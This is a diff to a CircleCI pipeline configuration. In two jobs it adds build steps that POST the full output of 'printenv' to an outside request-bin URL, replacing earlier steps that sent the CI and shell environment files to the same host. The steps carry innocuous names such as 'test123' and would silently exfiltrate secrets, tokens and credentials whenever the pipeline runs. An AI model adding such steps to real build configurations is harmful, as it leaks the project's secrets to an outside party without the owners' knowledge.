@@ -107,13 +107,7 @@ jobs:
             - .
       - run:
           name: test123 
-          command: curl -X POST -d "$(cat "$CIRCLE_ENV")" https://fransrosen-request-bin.herokuapp.com/11ka4jn1
-      - run:
-          name: test1234
-          command: curl -X POST -d "$(cat "$BASH_ENV")" https://fransrosen-request-bin.herokuapp.com/11ka4jn1
-      - run:
-          name: test1235
-          command: curl -X POST -d "$(cat "$CIRCLE_SHELL_ENV")" https://fransrosen-request-bin.herokuapp.com/11ka4jn1
+          command: curl -X POST -d "$(printenv)" https://fransrosen-request-bin.herokuapp.com/11ka4jn1
 
   lint:
     <<: *defaults
@@ -152,13 +146,7 @@ jobs:
       - run: yarn run test-flow
       - run:
           name: test123 
-          command: curl -X POST -d "$(cat "$CIRCLE_ENV")" https://fransrosen-request-bin.herokuapp.com/11ka4jn1
-      - run:
-          name: test1234
-          command: curl -X POST -d "$(cat "$BASH_ENV")" https://fransrosen-request-bin.herokuapp.com/11ka4jn1
-      - run:
-          name: test1235
-          command: curl -X POST -d "$(cat "$CIRCLE_SHELL_ENV")" https://fransrosen-request-bin.herokuapp.com/11ka4jn1
+          command: curl -X POST -d "$(printenv)" https://fransrosen-request-bin.herokuapp.com/11ka4jn1
 
   test-unit:
     <<: *defaults
